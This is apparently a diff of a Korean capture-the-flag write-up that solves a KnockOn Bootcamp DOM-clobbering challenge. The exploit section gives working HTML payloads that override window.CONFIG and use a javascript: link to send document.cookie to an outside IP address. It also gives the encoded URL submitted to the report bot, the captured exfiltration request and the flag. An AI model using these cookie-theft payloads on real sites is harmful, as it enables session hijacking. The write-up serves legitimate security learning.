@@ -1,50 +1,33 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 7. Dom clobbering"
+title: "KnockOn Bootcamp 2nd - 7. DOM Clobbering"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
-  - DOM Based
+  - KnockOn Bootcamp 2nd
+  - DOM-Based XSS
   - DOM Clobbering
-last_modified_at: 2024-09-15T14:00:00-05:00
+last_modified_at: 2024-09-16T04:00:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10010/>
 
-![7. Dom clobbering 1](/assets/images/writeup/web-hacking/knock-on/7_DOM_1.png)
+![7. Dom clobbering 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-1.png)
 
-![7. Dom clobbering 2](/assets/images/writeup/web-hacking/knock-on/7_DOM_2.png)
-
+![7. Dom clobbering 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-2.png)
 
 ### 목표
 
----
-
-DOM 속성을 조작해 쿠키 탈취 
-
-|
+DOM 속성을 조작해 쿠키 탈취
 
 ### 공격 기법
 
----
+DOM Clobbering
 
-Cross Site Scripting
-
-- DOM Based
+- DOM Based XSS
 - DOM Clobbering
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -143,23 +126,13 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10010, debug=True)
 ```
 
-|
-
-|
-
-|
-
 ## 분석
 
 ### /report
 
----
+![7. Dom clobbering 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-3.png)
 
-![7. Dom clobbering 3](/assets/images/writeup/web-hacking/knock-on/7_DOM_3.png)
-
-|
-
-![7. Dom clobbering 4](/assets/images/writeup/web-hacking/knock-on/7_DOM_4.png)
+![7. Dom clobbering 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-4.png)
 
 ```js
 <script>
@@ -177,21 +150,13 @@ if __name__ == "__main__":
 
 그냥 사용자 경험을 위해 있는 거 같음
 
-|
-
-|
-
 ### /practice
 
----
-
-![7. Dom clobbering 5](/assets/images/writeup/web-hacking/knock-on/7_DOM_5.png)
+![7. Dom clobbering 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-5.png)
 
 `content`에 내용을 입력 후 Submit을 누르고 URL을 보면 GET방식으로 데이터를 처리하는 것을 알 수 있음
 
-|
-
-![7. Dom clobbering 6](/assets/images/writeup/web-hacking/knock-on/7_DOM_6.png)
+![7. Dom clobbering 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-6.png)
 
 ```js
 <script>
@@ -208,8 +173,6 @@ if __name__ == "__main__":
 
 또한 스크립트 코드가 숨겨져있음
 
-|
-
 ```js
 window.CONFIG = window.CONFIG || {
   check: false,
@@ -225,8 +188,6 @@ window.CONFIG = window.CONFIG || {
 
 이 부분을 이용해서 스크립트 실행 전에 `window.CONFIG`객체를 정의하여 해당 값을 실행하게 만들 수 있음
 
-|
-
 ```js
 if (window.CONFIG.check !== false) {
   location.href = window.CONFIG.location
@@ -235,17 +196,9 @@ if (window.CONFIG.check !== false) {
 
 `window.CONFIG.check`가 `false`가 아니라면, `location.herf`를 `window.CONFIG.location`에 설정된 URL로 설정하여 스크립트를 실행함
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### practice()
-
----
 
 ```python
 @app.route("/practice", methods=["GET"])
@@ -271,8 +224,6 @@ if not content:
 
 `GET`으로 `content`의 값을 받아 처리함
 
-|
-
 ```python
 sanitized_content = bleach.clean(
     content,
@@ -286,13 +237,7 @@ sanitized_content = bleach.clean(
 
 여기에 있는 태그, 속성,  프로토콜만 사용 가능
 
-|
-
-|
-
 ### report()
-
----
 
 ```python
 @app.route("/report", methods=["GET", "POST"])
@@ -325,8 +270,6 @@ if request.method == "GET":
 
 `GET`요청이 들어오면 페이지 랜더링
 
-|
-
 ```python
 target_url = localhost + request.form["report_url"]
 
@@ -337,11 +280,9 @@ target_url = localhost + request.form["report_url"]
 
 ```
 
-`POST`요청이면 `locathost`와 `report_url`폼 데이터를 결합해 `target_url`설정 
+`POST`요청이면 `locathost`와 `report_url`폼 데이터를 결합해 `target_url`설정
 
 `target_url`로 `GET`요청을 보냈을 때 `404`이면 에러 메시지 출력
-
-|
 
 ```python
 cookie = {"name": "cookie", "value": FLAG}
@@ -359,13 +300,7 @@ else:
 
 `read_url()`함수 반환값이 있는 경우(`success`가 참인 경우), 성공 메시지.  아니면 실패 메시지 반환
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```js
 window.CONFIG = window.CONFIG || {
@@ -380,13 +315,7 @@ if (window.CONFIG.check !== false) {
 
 `/practice`에 있는 스크립트 코드의 `window.CONFIG`객체를 위와 같이 `check: true`, `location: "공격자 서버 URL"`로 설정해줘야함
 
-|
-
-|
-
 ### window.CONFIG.check
-
----
 
 ```html
 <a id="CONFIG" name="check">123</a>
@@ -396,13 +325,7 @@ if (window.CONFIG.check !== false) {
 
 `window.CONFIG`객체의 `check`값을 설정. 이렇게 하면 `check: true`가 됨
 
-|
-
-|
-
 ### window.CONFIG.location
-
----
 
 ```html
 <a id="CONFIG" name="location" href="http://20.41.120.97/">456</a>
@@ -412,31 +335,19 @@ if (window.CONFIG.check !== false) {
 
 이렇게 하면 페이지 랜더링과 동시에 `href`에 설정된 `URL`로 리다이렉션됨
 
-|
-
 ```html
 <a id="CONFIG" name="location" href=javascript:location.href="http://20.41.120.97/"+document.cookie>456</a>
 ```
 
 쿠키 값을 넘겨주기 위해 `javascript`프로토콜을 활용
 
-|
-
 이렇게  `window.CONFIG`객체의 `check`와 `location`을 원하는대로 정의 완료
-
-|
-
-|
 
 ### Report URL
 
----
-
-![7. Dom clobbering 7](/assets/images/writeup/web-hacking/knock-on/7_DOM_7.png)
+![7. Dom clobbering 7](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-7.png)
 
 이번 문제에서는 게시물을 업로드하는 기능이 없기 때문에, 봇이 해당 `post`의 `id`로 접근하는 식의 방법을 사용할 수 없음
-
-|
 
 ```python
 target_url = localhost + request.form["report_url"]
@@ -444,30 +355,20 @@ target_url = localhost + request.form["report_url"]
 
 `report()` 에서 `target_url`을 `report_url`폼의 데이터를 결합해 설정하는 것을 활용해야함
 
-|
-
-|
-
 ### 인코딩된 URL 얻기
-
----
 
 ```html
 <a id="CONFIG" name="check"></a>
 <a id="CONFIG" name="location" href=javascript:location.href="http://20.41.120.97/"+document.cookie></a>
 ```
 
-![7. Dom clobbering 8](/assets/images/writeup/web-hacking/knock-on/7_DOM_8.png)
+![7. Dom clobbering 8](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-8.png)
 
-![7. Dom clobbering 9](/assets/images/writeup/web-hacking/knock-on/7_DOM_9.png)
+![7. Dom clobbering 9](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-9.png)
 
 `/practive`에서 내용 입력 후 Submit을 누르면
 
 개발자도구의 `Network` 탭에서 인코딩된 URL을 얻을 수 있음
-
-|
-
-|
 
 ### Report URL 2
 
@@ -475,17 +376,11 @@ target_url = localhost + request.form["report_url"]
 target_url="http://localhost:10010/"+"practive?content=..."
 ```
 
-![7. Dom clobbering 10](/assets/images/writeup/web-hacking/knock-on/7_DOM_10.png)
+![7. Dom clobbering 10](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-7-dom-10.png)
 
 `/report`에서 `"practive?content=..."`형식의 인코딩된 URL을 넘겨주면 됨
 
-|
-
-|
-
 ### 결과
-
----
 
 ```sh
 GET /cookie=K0%7Bcl0bb3r1ng_4_D00M_w1th_D0M%7D HTTP/1.1
@@ -499,13 +394,7 @@ Accept-Encoding: gzip, deflate
 
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### /practice
 
@@ -514,26 +403,14 @@ Accept-Encoding: gzip, deflate
 <a id="CONFIG" name="location" href=javascript:location.href="http://20.41.120.97/"+document.cookie></a>
 ```
 
-|
-
 ### /report
 
 ```sh
 practice?content=%3Ca+id%3D%22CONFIG%22+name%3D%22check%22%3E%3C%2Fa%3E%0D%0A%3Ca+id%3D%22CONFIG%22+name%3D%22location%22+href%3Djavascript%3Alocation.href%3D%22https%3A%2F%2F20.41.120.97%2F%22%2Bdocument.cookie%3E%3C%2Fa%3E
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```sh
 K0{cl0bb3r1ng_4_D00M_w1th_D0M}
 ```
-
-|
-
----
